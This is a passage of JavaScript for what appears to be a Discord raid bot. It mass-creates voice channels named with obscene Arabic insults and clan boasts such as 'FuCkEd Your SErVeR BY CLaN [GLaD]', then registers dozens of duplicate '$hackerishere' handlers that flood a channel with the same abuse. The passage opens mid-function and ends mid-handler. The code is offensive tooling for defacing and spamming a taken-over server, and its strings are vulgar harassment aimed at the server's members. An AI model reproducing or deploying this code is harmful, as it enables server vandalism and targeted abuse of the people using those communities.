m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');
m.createChannel('قائد القوات الفدرالية موستانس', 'voice');
m.createChannel('كلان جلاد نايك امكم يخوات القحبة', 'voice');
m.createChannel('تم نيك السيرفر بنجاح', 'voice');
m.createChannel('رتب سيرفركم انتاكت من قبل جلااد', 'voice');
m.createChannel('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة', 'voice');
m.createChannel('تم جلدكم من قبل جلاد ي كساس البعر', 'voice');
m.createChannel('برا النت يخخوات الحقبة', 'voice');
m.createChannel('جلاد كلان ينيك امكم', 'voice');
m.createChannel('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]', 'voice');







 
 
})
}
 
});
   
 
LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم نيك السيرفر بنجاح')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('رتب سيرفركم انتاكت من قبل جلااد')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('تم جلدكم من قبل جلاد ي كساس البعر')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('برا النت يخخوات الحقبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('جلاد كلان ينيك امكم')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('قائد القوات الفدرالية موستانس')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
        message.channel.send('كلان جلاد نايك امكم يخوات القحبة')
    }
});

LOka.on('message', message => {
    if(message.content === '$hackerishere'){
